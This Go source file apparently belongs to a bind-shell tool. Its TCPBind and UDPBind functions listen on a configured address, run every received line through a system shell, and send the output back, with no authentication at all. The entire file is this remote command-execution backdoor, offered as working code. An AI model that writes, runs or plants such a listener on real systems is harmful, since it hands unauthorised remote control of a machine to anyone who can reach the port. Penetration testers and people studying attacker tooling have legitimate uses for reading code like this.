package main

import (
	"net"
	"log"
)

func TCPBind(config Config) {
	buffer := make([]byte, 1024)

	listener, err := net.Listen("tcp", config.Address)
	if err != nil {
		log.Fatalln(err)
	}
	defer listener.Close()
	log.Println("Listening on " + config.Address)

	for {
        conn, err := listener.Accept()
        if err != nil {
            log.Println(err)
        }

		conn.Write([]byte("Connection received on " + conn.RemoteAddr().String() + "\n"))
        
		for {
			length, err := conn.Read(buffer)
			if err != nil {
				break
			}
	
			if length == 0 {
				continue
			}

			output := Shell(config.Shell, buffer[:length-1])
			conn.Write(output)
		}
	
		conn.Close()
    }
}

func UDPBind(config Config) {
	listener, err := net.ListenPacket("udp", config.Address)
	if err != nil {
		log.Fatalln(err)
	}
	defer listener.Close()
	log.Println("Listening on " + config.Address)

	for {
		buffer := make([]byte, 1024)
        length, addr, err := listener.ReadFrom(buffer)
        if err != nil {
            log.Println(err)
        }

		if length == 0 {
			continue
		}

        output:= Shell(config.Shell, buffer[:length-1])
        listener.WriteTo(output, addr)
    }
}